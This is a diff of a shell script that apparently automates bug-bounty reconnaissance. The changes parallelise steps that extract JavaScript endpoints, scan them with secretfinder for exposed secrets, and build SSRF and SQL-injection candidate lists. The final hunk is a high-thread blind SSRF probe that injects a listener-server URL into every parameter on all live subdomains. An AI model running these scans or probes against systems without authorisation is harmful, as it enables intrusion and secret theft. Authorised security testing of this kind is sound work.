@@ -435,7 +435,7 @@ custompathlist(){
     sort -u $TARGETDIR/gospider/gospider_out.txt $TARGETDIR/page-fetched/pagefetcher_output.txt -o $rawList
   fi
 
-  xargs -n1 -I {} grep "{}" $rawList < $TARGETDIR/3-all-subdomain-live.txt > $queryList || true
+  xargs -P 20 -n1 -I {} grep "{}" $rawList < $TARGETDIR/3-all-subdomain-live.txt > $queryList || true
 
   if [[ -n "$brute" ]]; then
     echo "Prepare custom customFfufWordList"
@@ -451,26 +451,27 @@ custompathlist(){
     grep -ioE "(([[:alnum:][:punct:]]+)+)[.](js|json)" $queryList > $TARGETDIR/js-list.txt || true
 
     if [ -s $TARGETDIR/js-list.txt ]; then
+        sort -u $TARGETDIR/js-list.txt -o $TARGETDIR/js-list.txt
         echo "linkfinder"
-        xargs -n1 -I {} linkfinder -i {} -o cli < $TARGETDIR/js-list.txt | sort -u > $TARGETDIR/tmp/linkfinder-list.txt
+        xargs -P 20 -n1 -I {} linkfinder -i {} -o cli < $TARGETDIR/js-list.txt | sort -u > $TARGETDIR/tmp/linkfinder-list.txt
 
         if [ -s $TARGETDIR/tmp/linkfinder-list.txt ]; then
           echo "[debug-1] linkfinder"
             grep -ioE "https?://(([[:alnum:][:punct:]]+)+)?[.]?(([[:alnum:][:punct:]]+)+)[.](js|json)" $TARGETDIR/tmp/linkfinder-list.txt > $TARGETDIR/tmp/js-tmp-list.txt || true
             if [ -s $TARGETDIR/tmp/js-tmp-list.txt ]; then
               echo "[debug-2] linkfinder"
-                xargs -n1 -I {} grep "{}" $TARGETDIR/tmp/js-tmp-list.txt < $TARGETDIR/3-all-subdomain-live.txt >> $TARGETDIR/js-list.txt || true
+                xargs -P 20 -n1 -I {} grep "{}" $TARGETDIR/tmp/js-tmp-list.txt < $TARGETDIR/3-all-subdomain-live.txt >> $TARGETDIR/js-list.txt || true
                 sort -u $TARGETDIR/js-list.txt -o $TARGETDIR/js-list.txt
             fi
         fi
 
         echo "secretfinder"
-        xargs -n1 -I {} secretfinder -i {} -o cli < $TARGETDIR/js-list.txt > $TARGETDIR/tmp/secretfinder-list.txt
+        xargs -P 20 -n1 -I {} secretfinder -i {} -o cli < $TARGETDIR/js-list.txt > $TARGETDIR/tmp/secretfinder-list.txt
     fi
 
     echo "[$(date | awk '{ print $4}')] Prepare custom customSsrfQueryList"
     # https://github.com/tomnomnom/gf/issues/55
-    xargs -n1 -I {} grep -oiaE "(([[:alnum:][:punct:]]+)+)?{}=" $queryList < $PARAMSLIST >> $customSsrfQueryList || true &
+    xargs -P 20 -n1 -I {} grep -oiaE "(([[:alnum:][:punct:]]+)+)?{}=" $queryList < $PARAMSLIST >> $customSsrfQueryList || true &
     pid_01=$!
 
     echo "[$(date | awk '{ print $4}')] Prepare custom customSqliQueryList"
@@ -518,7 +519,7 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[$(date | awk '{ print $4}')] [SSRF-2] Blind probe..."
-    xargs -n1 -I {} ffuf -timeout 1 -ignore-body -t 1050 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -P 2 -I {} ffuf -timeout 1 -ignore-body -t 500 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
